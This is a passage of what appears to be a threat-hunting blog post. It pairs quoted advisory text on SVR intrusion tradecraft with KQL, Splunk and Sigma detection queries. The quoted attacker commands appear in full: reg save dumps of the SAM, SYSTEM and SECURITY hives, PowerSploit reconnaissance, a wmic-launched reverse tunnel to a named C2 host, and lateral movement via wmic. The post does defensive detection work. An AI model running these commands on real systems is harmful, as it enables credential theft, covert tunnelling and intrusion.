(((ScriptBlockText=”*Get-WmiObject*”) AND (ScriptBlockText=”*-Class*”) AND (ScriptBlockText=”*Win32_Service*”)) OR ((ScriptBlockText=”*Get-WindowsDriver*”) AND (ScriptBlockText=”*-Online*”) AND (ScriptBlockText=”*-All*”)))</span></pre><h2 id="925c" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">DLL names used by SVR for GraphicalProton backdoor</h2><blockquote class="mt mu mv"><p id="83bb" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">GraphicalProton is a simplistic backdoor that uses OneDrive, Dropbox, and randomly generated BMPs [T1027.001] to exchange data with the SVR operator.  After execution, GraphicalProton gathers environment information such as active TCP/UDP connections [T1049], running processes [T1049], as well as user, host, and domain names [T1590]. OneDrive is used as a primary communication channel while Dropbox is treated as a backup channel [T1567]. API keys are hardcoded into the malware. When communicating with cloud services, GraphicalProton generates a randomly named directory which is used to store infection-specific BMP files — with both commands and results [T1564.001]. Directory name is re-randomized each time the GraphicalProton process is started.</p></blockquote><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/DLL%20names%20used%20by%20SVR%20for%20GraphicalProton%20backdoor.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/DLL names used by SVR for GraphicalProton backdoor.yml at Russian-Threat-Actor ·…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="ql l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="5207" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="e60d" class="pb nv gv oy b bg pc pd l pe pf">DeviceImageLoadEvents | where (FolderPath endswith @’AclNumsInvertHost.dll’ or FolderPath endswith @’ModeBitmapNumericAnimate.dll’ or FolderPath endswith @’UnregisterAncestorAppendAuto.dll’ or FolderPath endswith @’DeregisterSeekUsers.dll’ or FolderPath endswith @’ScrollbarHandleGet.dll’ or FolderPath endswith @’PerformanceCaptionApi.dll’ or FolderPath endswith @’WowIcmpRemoveReg.dll’ or FolderPath endswith @’BlendMonitorStringBuild.dll’ or FolderPath endswith @’HandleFrequencyAll.dll’ or FolderPath endswith @’HardSwapColor.dll’ or FolderPath endswith @’LengthInMemoryActivate.dll’ or FolderPath endswith @’ParametersNamesPopup.dll’ or FolderPath endswith @’ModeFolderSignMove.dll’ or FolderPath endswith @’ChildPaletteConnected.dll’ or FolderPath endswith @’AddressResourcesSpec.dll’)</span></pre><p id="7c7c" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="2eeb" class="pb nv gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND (ImageLoaded=”*AclNumsInvertHost.dll” OR ImageLoaded=”*ModeBitmapNumericAnimate.dll” OR ImageLoaded=”*UnregisterAncestorAppendAuto.dll” OR ImageLoaded=”*DeregisterSeekUsers.dll” OR ImageLoaded=”*ScrollbarHandleGet.dll” OR ImageLoaded=”*PerformanceCaptionApi.dll” OR ImageLoaded=”*WowIcmpRemoveReg.dll” OR ImageLoaded=”*BlendMonitorStringBuild.dll” OR ImageLoaded=”*HandleFrequencyAll.dll” OR ImageLoaded=”*HardSwapColor.dll” OR ImageLoaded=”*LengthInMemoryActivate.dll” OR ImageLoaded=”*ParametersNamesPopup.dll” OR ImageLoaded=”*ModeFolderSignMove.dll” OR ImageLoaded=”*ChildPaletteConnected.dll” OR ImageLoaded=”*AddressResourcesSpec.dll”)</span></pre><h2 id="2d4a" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Sensitive registry entries saved to file</h2><blockquote class="mt mu mv"><p id="af86" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">In order to exfiltrate Windows Registry, the SVR saved hives into files [T1003.002], packed them, and then exfiltrated them using a backdoor capability. it used “reg save” to save SYSTEM, SAM and SECURITY registry hives, and used powershell to stage .zip archives in the</p></blockquote><p id="0e4c" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk"><strong class="mz gw">C:\Windows\Temp\</strong> directory:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="bc4c" class="pb nv gv oy b bg pc pd l pe pf">reg save HKLM\SYSTEM “”C:\Windows\temp\1\sy.sa”” /y  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="c3c4" class="pb nv gv oy b bg pc pd l pe pf">reg save HKLM\SAM “”C:\Windows\temp\1\sam.sa”” /y  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="fee4" class="pb nv gv oy b bg pc pd l pe pf">reg save HKLM\SECURITY “”C:\Windows\temp\1\se.sa”” /y  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="82e4" class="pb nv gv oy b bg pc pd l pe pf">powershell Compress-Archive -Path C:\Windows\temp\1\ -DestinationPath C:\Windows\temp\s.zip -Force &amp; del C:\Windows\temp\1 /F /Q</span></pre><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/Sensitive%20registry%20entries%20saved%20to%20file.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/Sensitive registry entries saved to file.yml at Russian-Threat-Actor ·…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qm l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="61ae" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="244a" class="pb nv gv oy b bg pc pd l pe pf">DeviceProcessEvents | where (FolderPath endswith @’reg.exe’ and ProcessCommandLine contains @’save’ and (ProcessCommandLine matches regex @’(?i).*HKLM\\SYSTEM.*|.*HKLM\\SECURITY.*|.*HKLM\\SAM.*’) and (ProcessCommandLine matches regex @’(?i).*sy\.sa.*|.*sam\.sa.*|.*se\.sa.*’))</span></pre><h2 id="660a" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Compressing files from temp to temp</h2><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/Compressing%20files%20from%20temp%20to%20temp.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/Compressing files from temp to temp.yml at Russian-Threat-Actor ·…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qn l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="6ad9" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="1d74" class="pb nv gv oy b bg pc pd l pe pf">DeviceEvents | where ActionType == “PowerShellCommand” | where ((AdditionalFields matches regex @’(?i).*Compress\-Archive.*Path.*Windows\\[Tt]{1}emp\\[1–9]{1}.*DestinationPath.*Windows\\[Tt]{1}emp\\.*’) or (InitiatingProcessCommandLine matches regex @’(?i).*Compress\-Archive.*Path.*Windows\\[Tt]{1}emp\\[1–9]{1}.*DestinationPath.*Windows\\[Tt]{1}emp\\.*’))</span></pre><h2 id="d561" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Scheduled tasks names used by SVR for Graphical backdoor</h2><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/Scheduled%20tasks%20names%20used%20by%20SVR%20for%20GraphicalProton%20backdoor%20command.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/Scheduled tasks names used by SVR for GraphicalProton backdoor command.yml at…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qo l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="ae07" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="8efb" class="pb nv gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND ((EventCode=”4698&quot; OR EventCode=”4699&quot; OR EventCode=”4702&quot;) AND (TaskName=”\\Microsoft\\Windows\\IISUpdateService” OR TaskName=”\\Microsoft\\Windows\\WindowsDefenderService” OR TaskName=”\\Microsoft\\Windows\\WindowsDefenderService2&quot; OR TaskName=”\\Microsoft\\DefenderService” OR TaskName=”\\Microsoft\\Windows\\DefenderUPDService” OR TaskName=”\\Microsoft\\Windows\\WiMSDFS” OR TaskName=”\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck” OR TaskName=”\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting” OR TaskName=”\\Microsoft\\Windows\\Windows Defender\\Defender Update Service” OR TaskName=”\\WindowUpdate” OR TaskName=”\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting” OR TaskName=”\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck” OR TaskName=”\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask” OR TaskName=”\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart” OR TaskName=”\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Update” OR TaskName=”\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck” OR TaskName=”\\Microsoft\\Windows\\ATPUpd” OR TaskName=”\\Microsoft\\Windows\\Windows Defender\\Service Update” OR TaskName=”\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check” OR TaskName=”\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck” OR TaskName=”\\Defender” OR TaskName=”\\defender” OR TaskName=”\\Microsoft\\Windows\\IISUpdateService” OR TaskName=”\\Microsoft\\Windows\\WindowsDefenderService” OR TaskName=”\\Microsoft\\Windows\\WindowsDefenderService2&quot; OR TaskName=”\\Microsoft\\DefenderService” OR TaskName=”\\Microsoft\\Windows\\DefenderUPDService” OR TaskName=”\\Microsoft\\Windows\\WiMSDFS” OR TaskName=”\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCkeck” OR TaskName=”\\Microsoft\\Windows\\Windows Error Reporting\\SubmitReporting” OR TaskName=”\\Microsoft\\Windows\\Windows Defender\\Defender Update Service” OR TaskName=”\\WindowUpdate” OR TaskName=”\\Microsoft\\Windows\\Windows Error Reporting\\CheckReporting” OR TaskName=”\\Microsoft\\Windows\\Application Experience\\StartupAppTaskCheck” OR TaskName=”\\Microsoft\\Windows\\Speech\\SpeechModelInstallTask” OR TaskName=”\\Microsoft\\Windows\\Windows Filtering Platform\\BfeOnServiceStart” OR TaskName=”\\Microsoft\\Windows\\Data Integrity Scan\\Data Integrity Update” OR TaskName=”\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck” OR TaskName=”\\Microsoft\\Windows\\ATPUpd” OR TaskName=”\\Microsoft\\Windows\\Windows Defender\\Service Update” OR TaskName=”\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Check” OR TaskName=”\\Microsoft\\Windows\\WindowsUpdate\\Scheduled AutoCheck” OR TaskName=”\\Defender” OR TaskName=”\\defender”))</span></pre><p id="b800" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="8acb" class="pb nv gv oy b bg pc pd l pe pf">DeviceProcessEvents | where ((FolderPath endswith @’schtasks.exe’ and (ProcessCommandLine contains @’IISUpdateService’ or ProcessCommandLine contains @’WindowsDefenderService’ or ProcessCommandLine contains @’WindowsDefenderService2&#x27; or ProcessCommandLine contains @’DefenderService’ or ProcessCommandLine contains @’DefenderUPDService’ or ProcessCommandLine contains @’WiMSDFS’ or ProcessCommandLine contains @’StartupAppTaskCkeck’ or ProcessCommandLine contains @’SubmitReporting’ or ProcessCommandLine contains @’Defender Update Service’ or ProcessCommandLine contains @’WindowUpdate’ or ProcessCommandLine contains @’CheckReporting’ or ProcessCommandLine contains @’StartupAppTaskCheck’ or ProcessCommandLine contains @’SpeechModelInstallTask’ or ProcessCommandLine contains @’BfeOnServiceStart’ or ProcessCommandLine contains @’Data Integrity Update’ or ProcessCommandLine contains @’Scheduled AutoCheck’ or ProcessCommandLine contains @’ATPUpd’ or ProcessCommandLine contains @’Service Update’ or ProcessCommandLine contains @’Scheduled Check’ or ProcessCommandLine contains @’Scheduled AutoCheck’ or ProcessCommandLine contains @’Defender’ or ProcessCommandLine contains @’defender’)) or (FolderPath endswith @’schtasks.exe’ and ((ProcessCommandLine matches regex @’(?i).*Defender\sUpdate\sService.*’) or (ProcessCommandLine matches regex @’(?i).*Data\sIntegrity\sUpdate.*’) or (ProcessCommandLine matches regex @’(?i).*Scheduled\sAutoCheck.*’) or (ProcessCommandLine matches regex @’(?i).*Service\sUpdate.*’) or (ProcessCommandLine matches regex @’(?i).*Scheduled\sCheck.*’) or (ProcessCommandLine matches regex @’(?i).*Scheduled\sAutoCheck.*’))))</span></pre><h2 id="2643" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Tactics Used to Avoid Detection</h2><blockquote class="mt mu mv"><p id="f8b4" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">To<!-- --> avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” [T1068] technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software [T1562.001]. This was done using an open source project called “EDRSandBlast.” The authoring agencies have observed the SVR using EDRSandBlast to remove protected process light (PPL) protection, which is used for controlling and protecting running processes and protecting them from infection. The actors then inject code into AV/EDR processes for a small subset of victims [T1068].</p></blockquote><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/EDRSandblast%20Malicious%20Driver%20Detection.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/EDRSandblast Malicious Driver Detection.yml at Russian-Threat-Actor ·…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qp l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="9a9b" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="7c21" class="pb nv gv oy b bg pc pd l pe pf">DeviceFileEvents | where (InitiatingProcessFolderPath endswith @’WNBIOS.sys’ or InitiatingProcessFolderPath endswith @’ntkrnlmp.pdb’ or InitiatingProcessFolderPath endswith @’GDRV.sys’ or InitiatingProcessFolderPath endswith @’RTCore64.sys’ or InitiatingProcessFolderPath endswith @’DBUtil_2_3.sys’)</span></pre><p id="ae4f" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="f321" class="pb nv gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:*” AND (Image=”*WNBIOS.sys” OR Image=”*ntkrnlmp.pdb” OR Image=”*GDRV.sys” OR Image=”*RTCore64.sys” OR Image=”*DBUtil_2_3.sys”)</span></pre><h2 id="a94f" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Further Recon Hunting and Redteaming opportunities</h2><blockquote class="mt mu mv"><p id="47cf" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">After the SVR built a secure foothold and gained an awareness of a victim’s TeamCity server, it then focused on network reconnaissance [T1590.004]. The SVR performed network reconnaissance using a mix of built-in commands and additional tools, such as port scanner and PowerSploit, which it launched into memory [T1046]. The SVR executed the following PowerSploit commands:</p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="cf62" class="pb nv gv oy b bg pc pd l pe pf">Get-NetComputer  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="c602" class="pb nv gv oy b bg pc pd l pe pf">Get-NetGroup  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="9733" class="pb nv gv oy b bg pc pd l pe pf">Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount”  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="2948" class="pb nv gv oy b bg pc pd l pe pf">Get-NetDiDomain  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="543a" class="pb nv gv oy b bg pc pd l pe pf">Get-AdUser  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="0615" class="pb nv gv oy b bg pc pd l pe pf">Get-DomainUser -UserName  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="3b2e" class="pb nv gv oy b bg pc pd l pe pf">Get-NetUser -PreauthNotRequire  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="8d05" class="pb nv gv oy b bg pc pd l pe pf">Get-NetComputer | select samaccountname  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="3f5c" class="pb nv gv oy b bg pc pd l pe pf">Get-NetUser -SPN | select serviceprincipalname</span></pre><h2 id="201e" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Living Off The Land and Exploitation Active Directory</h2><figure class="os ot ou ov ow qt qq qr paragraph-image"><div class="qq qr qs"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*EWt3AdiycW609A2CPEDI2A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*EWt3AdiycW609A2CPEDI2A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*EWt3AdiycW609A2CPEDI2A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*EWt3AdiycW609A2CPEDI2A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*EWt3AdiycW609A2CPEDI2A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*EWt3AdiycW609A2CPEDI2A.png 1100w, https://miro.medium.com/v2/resize:fit:418/format:webp/1*EWt3AdiycW609A2CPEDI2A.png 418w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 209px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*EWt3AdiycW609A2CPEDI2A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*EWt3AdiycW609A2CPEDI2A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*EWt3AdiycW609A2CPEDI2A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*EWt3AdiycW609A2CPEDI2A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*EWt3AdiycW609A2CPEDI2A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*EWt3AdiycW609A2CPEDI2A.png 1100w, https://miro.medium.com/v2/resize:fit:418/1*EWt3AdiycW609A2CPEDI2A.png 418w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 209px"/><img alt="" class="bh ma qu c" width="209" height="149" loading="lazy" role="presentation"/></picture></div></figure><p id="382d" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Commands like above are used by threat actors when they try to get further information about the Active Directory to move laterally. Further commands could be found here<a class="af nt" href="https://lolad-project.github.io/" rel="noopener ugc nofollow" target="_blank"> LOLAD</a>.</p><blockquote class="mt mu mv"><p id="e933" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">The <strong class="mz gw">LOLAD and Exploitation</strong> project provides a comprehensive collection of Active Directory techniques, commands, and functions that can be used natively to support offensive security operations and Red Team exercises. These techniques leverage AD’s built-in tools to conduct reconnaissance, privilege escalation, and lateral movement, among other tactics. Understanding these methods helps defenders strengthen AD configurations and improve monitoring capabilities.</p></blockquote><p id="2147" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">I’ve written for all commands a Sigma Rule for threat hunting.</p><div class="ph pi pj pk pl pm"><a href="https://github.com/Schmouni242/Sigma-Rules/blob/Russian-Threat-Actor/Living%20Off%20The%20Land%20and%20Exploitation%20Active%20Directory.yml?source=post_page-----1b40810f8552--------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="pn ab jf"><div class="po ab co cb pp pq"><h2 class="bf gw iw z pr ps pt pu pv pw px gu bk">Sigma-Rules/Living Off The Land and Exploitation Active Directory.yml at Russian-Threat-Actor ·…</h2><div class="py l"><h3 class="bf b iw z pr ps pt pu pv pw px du">Sigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242/Sigma-Rules development by creating an…</h3></div><div class="pz l"><p class="bf b dv z pr ps pt pu pv pw px du">github.com</p></div></div><div class="qa l"><div class="qv l qc qd qe qa qf ma pm"></div></div></div></a></div><p id="f653" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">MDE KQL:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="7708" class="pb nv gv oy b bg pc pd l pe pf">DeviceProcessEvents | where (((FolderPath endswith @’\powershell.exe’ or FolderPath endswith @’\pwsh.exe’ or FolderPath endswith @’\powershell_ise.exe’) or ProcessVersionInfoOriginalFileName in~ (@’PowerShell.EXE’, @’pwsh.dll’)) and (ProcessCommandLine contains @’Get-AD ‘ or ProcessCommandLine contains @’Get-GPO’ or ProcessCommandLine contains @’Search-ADAccount’ or ProcessCommandLine contains @’Get-NetGroup’ or ProcessCommandLine contains @’Get-NetDomain’ or ProcessCommandLine contains @’Get-NetDomainTrust’ or ProcessCommandLine contains @’Get-LocalGroupMember’ or ProcessCommandLine contains @’Get-NetUser’ or ProcessCommandLine contains @’Get-DomainPolicy’ or ProcessCommandLine contains @’Get-NetSession’ or ProcessCommandLine contains @’Get-DnsServer’ or ProcessCommandLine contains @’Get-ADReplicationSubnet’ or ProcessCommandLine contains @’Get-EventLog’ or ProcessCommandLine contains @’Clear-EventLog’ or ProcessCommandLine contains @’Backup-GPO’))</span></pre><p id="d99d" class="pw-post-body-paragraph mw mx gv mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Splunk:</p><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="6437" class="pb nv gv oy b bg pc pd l pe pf">index=* source=”WinEventLog:Microsoft-Windows-Sysmon/Operational” AND (((NewProcessName=”*\\powershell.exe” OR NewProcessName=”*\\pwsh.exe” OR NewProcessName=”*\\powershell_ise.exe”) OR (OriginalFileName=”PowerShell.EXE” OR OriginalFileName=”pwsh.dll”)) AND (CommandLine=”*Get-AD *” OR CommandLine=”*Get-GPO*” OR CommandLine=”*Search-ADAccount*” OR CommandLine=”*Get-NetGroup*” OR CommandLine=”*Get-NetDomain*” OR CommandLine=”*Get-NetDomainTrust*” OR CommandLine=”*Get-LocalGroupMember*” OR CommandLine=”*Get-NetUser*” OR CommandLine=”*Get-DomainPolicy*” OR CommandLine=”*Get-NetSession*” OR CommandLine=”*Get-DnsServer*” OR CommandLine=”*Get-ADReplicationSubnet*” OR CommandLine=”*Get-EventLog*” OR CommandLine=”*Clear-EventLog*” OR CommandLine=”*Backup-GPO*”))</span></pre><h2 id="ee00" class="nu nv gv bf nw nx ny dy nz oa ob ea oc ng od oe of nk og oh oi no oj ok ol om bk">Tunneling into Compromised Environments</h2><blockquote class="mt mu mv"><p id="2c00" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">In selected environments the SVR used an additional tool named, “<strong class="mz gw">rr.exe</strong>” — a modified open source reverse socks tunneler named Rsockstun — to establish a tunnel to the C2 infrastructure [T1572]. The authoring agencies are aware of the following infrastructure used in conjunction with “<strong class="mz gw">rr.exe</strong>”: </p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="93d9" class="pb nv gv oy b bg pc pd l pe pf"> 65.20.97[.]203:443  </span></pre><pre class="pg ox oy oz bp pa bb bk"><span id="8497" class="pb nv gv oy b bg pc pd l pe pf">Poetpages[.]com:8443 </span></pre><blockquote class="mt mu mv"><p id="3908" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">The SVR executed Rsockstun either in memory or using the Windows Management Instrumentation Command Line (WMIC) [T1047] utility after dropping it to disk: </p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="a534" class="pb nv gv oy b bg pc pd l pe pf">wmic process call create “C:\Program Files\Windows Defender Advanced Threat Protection\Sense.exe -connect poetpages.com -pass M554–0sddsf2@34232fsl45t31” </span></pre><blockquote class="mt mu mv"><p id="9067" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">Lateral Movement The SVR used WMIC to facilitate lateral movement [T1047],[T1210]. </p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="c3f6" class="pb nv gv oy b bg pc pd l pe pf">wmic /node:”””” /user:””” /password:”””” process call create “”rundll32 C:\Windows\system32\AclNumsInvertHost.dll AclNumsInvertHost”” </span></pre><blockquote class="mt mu mv"><p id="e103" class="mw mx my mz b ht na nb nc hw nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns go bk">The SVR also modified DisableRestrictedAdmin key to enable remote connections [T1210]. It modified Registry using the following reg command: </p></blockquote><pre class="os ot ou ov ow ox oy oz bp pa bb bk"><span id="34b3" class="pb nv gv oy b bg pc pd l pe pf">reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d “0” /f</span></pre></div></div></div></div></section></div></div></article></div><div class="ab cb"><div class="ci bh ga gb gc gd"><div class="qw qx ab ji"><div class="py ab"><a class="qy ay am ao" rel="noopener follow" href="/tag/cybersecurity?source=post_page-----1b40810f8552--------------------------------"><div class="qz fj cx ra gf rb rc bf b bg z bk rd">Cybersecurity</div></a></div><div class="py ab"><a class="qy ay am ao" rel="noopener follow" href="/tag/threat-detection?source=post_page-----1b40810f8552--------------------------------"><div class="qz fj cx ra gf rb rc bf b bg z bk rd">Threat Detection</div></a></div><div class="py ab"><a class="qy ay am ao" 